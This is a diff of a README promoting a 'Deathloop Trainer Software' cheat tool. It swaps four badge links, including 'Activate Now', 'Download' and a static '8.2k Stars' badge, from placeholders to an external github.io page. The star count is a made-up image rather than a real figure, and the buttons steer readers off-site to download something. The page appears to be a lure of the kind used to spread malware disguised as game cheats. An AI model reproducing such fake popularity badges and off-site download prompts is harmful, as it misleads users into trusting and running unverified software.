@@ -2,10 +2,10 @@
 
 The **Deathloop Trainer Software** gives you full control over Arkane’s stylish time-loop shooter. With **combat power-ups, resource editing, and stealth tools**, it transforms the game into a customizable sandbox where you can experiment with routes, powers, and strategies without restrictions.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-crimson?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 8.2k Stars](https://img.shields.io/badge/⭐️%208.2k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-crimson?style=for-the-badge\&logo=rocket)](https://deathloop-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://deathloop-trainer.github.io/.github/)
+[![⭐️ 8.2k Stars](https://img.shields.io/badge/⭐️%208.2k-Stars-yellow?style=for-the-badge\&logo=github)](https://deathloop-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://deathloop-trainer.github.io/.github/)
 
 ---
 
